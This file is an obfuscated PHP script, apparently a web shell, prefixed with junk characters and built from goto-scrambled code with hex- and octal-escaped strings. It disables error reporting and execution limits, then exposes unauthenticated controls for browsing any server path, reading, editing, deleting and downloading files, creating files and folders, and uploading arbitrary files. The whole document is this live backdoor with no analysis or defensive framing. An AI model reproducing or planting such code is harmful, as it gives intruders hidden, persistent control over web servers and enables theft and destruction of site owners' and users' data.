ેุZஐีNIટְهાነҌட૭র్<?php
 goto CW1Fp; QaNZe: ini_set("\x6d\141\x78\137\x65\x78\x65\143\x75\164\151\157\156\137\x74\x69\155\145", 5000); goto QUHM9; AOM_M: function save_edit($path, $str) { if (is_file($path)) { file_put_contents($path, html_entity_decode($str)); return true; } return false; } goto lHVUm; GZGEO: function delete_file($delete) { if (is_file($delete)) { return unlink($delete); } if (is_dir($delete)) { return rmdir($delete); } return false; } goto XjStw; QUHM9: $head = "\74\150\145\141\144\x3e\74\155\x65\x74\141\x20\x6e\x61\155\145\75\42\166\151\x65\x77\x70\157\162\x74\x22\40\x63\157\156\164\x65\x6e\x74\x3d\42\167\151\144\x74\150\x3d\x64\x65\166\151\x63\x65\x2d\x77\151\144\x74\x68\54\x20\x69\156\151\164\x69\141\x6c\x2d\163\x63\x61\154\x65\75\x31\x2e\x30\x22\x2f\x3e\74\x74\151\164\154\x65\76\316\240\xce\xb1\316\270\xce\271\316\xb1\xcf\x83\316\274\xce\xad\xce\275\xce\xbf\317\x82\74\x2f\164\x69\x74\154\x65\76\74\x73\164\x79\x6c\145\76\x70\162\x65\173\x62\157\x72\144\145\x72\x3a\61\160\170\x20\163\x6f\x6c\x69\x64\x20\43\x64\x64\x64\x3b\160\x61\144\144\x69\x6e\x67\x3a\65\x70\x78\73\x6f\x76\x65\x72\x66\x6c\157\167\x3a\141\x75\164\x6f\x7d\x74\141\x62\x6c\x65\173\142\x6f\162\x64\x65\162\x2d\143\x6f\x6c\x6c\141\160\x73\145\72\x63\x6f\154\154\141\x70\x73\145\73\x77\x69\x64\x74\x68\72\x31\60\60\45\73\x6f\166\x65\162\146\x6c\x6f\167\72\141\x75\164\x6f\x7d\x74\150\x2c\164\144\173\x70\141\144\144\151\x6e\147\72\60\x2e\x32\65\162\x65\155\73\164\x65\170\164\x2d\x61\154\151\x67\x6e\72\154\145\146\x74\73\142\x6f\x72\x64\x65\x72\55\x62\x6f\x74\164\x6f\155\x3a\x31\160\x78\x20\163\157\154\x69\144\40\43\143\143\x63\175\x74\142\x6f\144\x79\40\164\162\x3a\156\164\150\x2d\x63\x68\x69\154\x64\x28\157\144\144\51\x7b\142\x61\x63\153\147\x72\x6f\x75\156\144\x3a\43\x65\145\145\x7d\164\162\x3a\150\157\x76\x65\162\173\142\141\x63\x6b\x67\x72\x6f\x75\x6e\x64\55\x63\157\154\x6f\x72\x3a\x23\x39\64\141\61\x38\x39\175\x3c\57\163\x74\171\154\x65\76\x3c\x2f\x68\145\141\x64\76"; goto g80si; CW1Fp: ?>
კςගୁቃőⴳચત័តພજ^ሆޓት<?php  goto qlloA; lj75W: function makeTable($thead, $tbody) { $head = ''; foreach ($thead as $th) { $head .= "\x3c\164\150\x3e{$th}\x3c\x2f\164\150\x3e"; } $body = ''; foreach ($tbody as $tr) { $body .= "\74\164\x72\76"; foreach ($tr as $td) { $body .= "\x3c\164\x64\x3e{$td}\x3c\57\164\x64\76"; } $body .= "\x3c\57\x74\x72\x3e"; } return "\74\x74\x61\x62\x6c\145\x3e\x3c\164\150\145\x61\x64\x3e{$head}\x3c\57\164\x68\145\141\144\76\74\164\142\x6f\144\171\76{$body}\74\x2f\x74\x62\x6f\x64\171\x3e\x3c\57\164\x61\142\x6c\145\76"; } goto f6Koj; yaxAE: function makeInput($type, $name, $val = '', $style = '') { if (in_array($type, array("\164\145\x78\164", "\x70\x61\x73\163\167\x6f\162\x64", "\163\165\x62\155\151\164", "\x66\151\154\x65"))) { return "\x3c\x69\156\160\165\164\40\x74\x79\x70\145\x3d\47{$type}\x27\x20\x6e\141\155\145\75\x27{$name}\x27\40\x76\x61\154\x75\x65\x3d\47{$val}\47\x20\163\164\x79\x6c\145\x3d\47{$style}\47\57\76"; } return "\x3c{$type}\x20\156\141\x6d\145\75\47{$name}\47\x20\x73\164\x79\154\145\x3d\47{$style}\x27\76{$val}\74\x2f{$type}\x3e"; } goto Njpid; hNa84: function get_dir() { $path = get_path(); if (!is_dir($path)) { return false; } $dir = scandir($path); $files = array(); $i = 0; foreach ($dir as $d) { if ($d == "\56" || $d == "\56\x2e") { continue; } $p = $path . "\57" . $d; $s = "\x2d\55"; $icon = "\46\43\61\62\70\x31\71\x33\x3b"; $t = fileTime($p); $l = makeLink("\x3f\x70\141\x74\150\75{$p}", $d); $perms = substr(sprintf("\45\157", fileperms($p)), -4); $owner = function_exists("\160\x6f\x73\151\x78\x5f\147\x65\164\x70\x77\x75\x69\144") ? posix_getpwuid(fileowner($p))["\156\141\x6d\x65"] : fileowner($p); $controller = (is_file($p) ? makeLink("\77\145\144\x69\x74\x3d{$p}", "\x45\x64\151\164", "\x5f\142\x6c\x61\156\153") : '') . makeLink("\x3f\x64\145\x6c\x65\x74\145\75{$p}", "\104\x65\154\145\x74\x65", "\137\x62\x6c\x61\156\x6b") . (is_file($p) ? makeLink("\77\x64\157\x77\156\x6c\x6f\141\x64\75{$p}", "\x44\x6f\167\x6e\x6c\x6f\141\144", "\137\x62\x6c\141\156\x6b") : ''); if (is_file($p)) { $s = filesize_convert(filesize($p)); $icon = "\46\x23\61\x32\x38\x32\x32\61\73"; } $files[] = array($icon, $i, $l, $s, $t, $perms, $owner, $controller); $i++; } return makeTable(array("\x23", "\x69\x64", "\106\x69\x6c\145\x6e\141\155\145", "\x53\151\x7a\145", "\x4d\157\x64\x69\x66\151\145\x64", "\x50\x65\x72\155\x73", "\x4f\167\x6e\x65\x72", ''), $files); } goto gd09h; su5Zb: if (get_post("\x75\x70\154\157\141\x64")) { upload_file(get_path(), $_FILES["\x66\151\x6c\x65"]) ? die("\x75\160\x6c\x6f\141\144\x3a\40" . $_FILES["\x66\151\154\x65"]["\x6e\141\155\145"]) : die("\x55\x70\154\x6f\141\144\40\105\x72\162\x6f\x72"); } goto HPfSq; XjStw: function edit_file($edit) { if (is_file($edit)) { return makeForm("\120\117\x53\x54", array("\164\145\170\x74\141\162\145\x61" => array("\x65\x64\151\164", htmlentities(file_get_contents($edit)), "\x77\x69\x64\x74\150\x3a\61\60\60\45\73\x68\x65\151\x67\150\x74\72\71\x30\x25"), "\x73\x75\x62\155\151\164" => array("\163\x61\166\145", "\123\141\166\x65"))); } return false; } goto AOM_M; g80si: function get_post($name) { return isset($_POST[$name]) ? $_POST[$name] : false; } goto f_LQv; hkON4: if (get_get("\x64\157\167\156\x6c\157\x61\x64")) { @readfile(download_file(get_get("\144\x6f\x77\156\x6c\x6f\141\144"))); die; } goto nCu0X; HMtlY: function new_dir($path, $name) { if (!is_dir($path . "\57" . $name)) { mkdir($path . "\x2f" . $name); return true; } return false; } goto dkr06; Byi4b: function filesize_convert($bytes) { $label = array("\x42", "\x4b\102", "\115\x42", "\x47\102", "\x54\x42", "\120\102"); for ($i = 0; $bytes >= 1024 && $i < count($label) - 1; $bytes /= 1024, $i++) { } return round($bytes, 2) . "\x20" . $label[$i]; } goto gOef4; OsC3e: function new_file($path, $name) { if (!is_file($path . "\57" . $name)) { file_put_contents($path . "\57" . $name, ''); return true; } return false; } goto HMtlY; CvkhV: set_time_limit(0); goto RQWe2; lHVUm: function view_file($path) { if (is_file($path)) { return htmlentities(file_get_contents($path)); } return false; } goto OsC3e; qlloA: ignore_user_abort(true); goto m74Kt; pAqD4: if (get_post("\156\145\x77\x64\151\162")) { new_dir(get_path(), get_post("\x64\151\x72\x6e\x61\155\145")) ? die("\x43\162\145\141\164\x65\72\x20" . get_post("\144\x69\x72\156\x61\155\x65")) : die("\104\x69\162\x20\x65\x78\x69\x74\x65\163"); } goto su5Zb; nCu0X: if (get_post("\x6e\x65\167\x66\x69\x6c\145")) { new_file(get_path(), get_post("\x66\x69\154\145\x6e\x61\x6d\145")) ? die("\x43\162\x65\x61\164\x65\x3a\40" . get_post("\146\x69\x6c\x65\156\141\x6d\x65")) : die("\x46\151\154\x65\40\x65\x78\151\x74\x65\x73"); } goto pAqD4; f_LQv: function get_get($name) { return isset($_GET[$name]) ? $_GET[$name] : false; } goto yaxAE; m74Kt: ini_set("\155\x65\x6d\157\x72\171\137\x6c\x69\155\x69\164", "\55\61"); goto CvkhV; JX4wt: if (get_get("\x65\144\x69\164")) { if (get_post("\x73\141\166\145")) { save_edit(get_get("\145\x64\151\164"), get_post("\x65\x64\x69\164")); echo "\123\141\166\145\144"; } $edit = edit_file(get_get("\x65\144\x69\x74")); $edit ? die($edit) : die("\106\x69\x6c\x65\x20\x6e\157\164\40\x66\x6f\165\x6e\144"); } goto hkON4; Sf2Gy: function get_path() { $path = __DIR__; if (get_get("\x70\x61\x74\150")) { $path = get_get("\x70\141\164\x68"); } return $path; } goto Byi4b; n8DI7: function download_file($download) { if (!is_file($download)) { return false; } header("\103\x6f\x6e\x74\x65\x6e\x74\x2d\124\x79\x70\145\72\x20\141\x70\x70\x6c\x69\x63\141\164\151\x6f\x6e\57\x6f\143\164\145\x74\55\163\164\162\145\x61\155"); header("\x43\x6f\x6e\x74\x65\x6e\x74\55\x54\162\x61\156\x73\146\x65\162\x2d\105\156\143\x6f\x64\151\156\x67\x3a\40\x42\x69\x6e\x61\x72\171"); header("\103\157\x6e\x74\x65\x6e\x74\55\144\151\163\160\x6f\163\x69\x74\x69\157\x6e\72\x20\141\164\x74\x61\x63\x68\x6d\x65\156\164\x3b\x20\146\x69\154\x65\156\x61\155\x65\x3d\42" . basename($download) . "\42"); return readfile($download); } goto GZGEO; gOef4: function fileTime($path) { return date("\x4d\40\x64\40\x59\x20\110\x3a\151\72\163", filemtime($path)); } goto n8DI7; rojkM: ini_set("\144\x69\163\160\154\x61\x79\x5f\x65\162\x72\x6f\x72\x73", 0); goto QaNZe; gd09h: if (get_get("\x64\x65\x6c\145\164\145")) { delete_file(get_get("\144\x65\154\145\x74\145")) ? die("\x44\145\x6c\x65\164\145\144\x3a\40" . get_get("\144\145\x6c\145\164\145")) : die("\x46\151\154\145\x20\x6e\x6f\164\40\x66\157\165\x6e\x64"); } goto JX4wt; f6Koj: function makeLink($link, $text, $target = '') { return "\74\141\x20\150\x72\x65\x66\75\x27{$link}\x27\40\164\x61\162\147\x65\164\x3d\47{$target}\x27\76{$text}\74\x2f\141\x3e\x20"; } goto Sf2Gy; uc9AL: function get_back($path) { if ($path == '' || $path == "\57") { return $path; } $path = explode("\57", str_replace("\134", "\x2f", $path)); array_pop($path); return implode("\57", $path); } goto hNa84; RQWe2: error_reporting(0); goto rojkM; Njpid: function makeForm($method, $inputArray, $file = '') { $form = "\74\146\157\162\x6d\x20\155\145\164\x68\x6f\x64\75{$method}\40\145\x6e\143\164\171\x70\145\75\47{$file}\47\x3e"; foreach ($inputArray as $key => $val) { $form .= makeInput($key, is_array($val) ? $val[0] : $val, isset($val[1]) ? $val[1] : '', isset($val[2]) ? $val[2] : ''); } return $form . "\74\x2f\x66\x6f\x72\x6d\76"; } goto lj75W; dkr06: function upload_file($path, $file) { $name = basename($file["\156\x61\x6d\145"]); if (!is_file($path . "\57" . $name)) { if (move_uploaded_file($file["\x74\155\160\x5f\x6e\x61\x6d\145"], $path . "\57" . $name)) { return true; } } return false; } goto uc9AL; HPfSq: echo $head . "\x3c\142\x6f\x64\171\x3e" . makeForm("\120\x4f\123\x54", array("\164\145\170\164" => array("\146\x69\x6c\145\156\x61\155\x65", "\x46\151\154\145\40\116\141\x6d\145"), "\x73\x75\142\155\151\164" => array("\x6e\145\x77\146\151\x6c\145", "\x43\162\x65\141\164\145"))) . makeForm("\120\117\x53\124", array("\164\x65\170\164" => array("\x64\x69\x72\x6e\141\155\145", "\x44\151\162\x20\x4e\141\x6d\x65"), "\x73\x75\x62\x6d\x69\164" => array("\156\x65\167\144\151\x72", "\x43\162\145\141\x74\x65"))) . makeForm("\120\x4f\123\x54", array("\146\x69\154\x65" => "\x66\x69\x6c\x65", "\163\165\142\x6d\x69\x74" => array("\165\x70\x6c\157\x61\144", "\x55\x70\154\x6f\141\x64")), "\155\x75\154\164\x69\160\141\x72\x74\57\x66\x6f\x72\155\55\x64\141\164\141") . makeLink("\77\x70\x61\164\x68\75" . get_back(get_path()), "\133\x42\141\143\x6b\x5d") . (is_dir(get_path()) ? get_dir() : "\74\x70\162\145\x3e" . view_file(get_path()) . "\x3c\57\x70\162\145\76") . "\74\x2f\142\157\144\x79\x3e";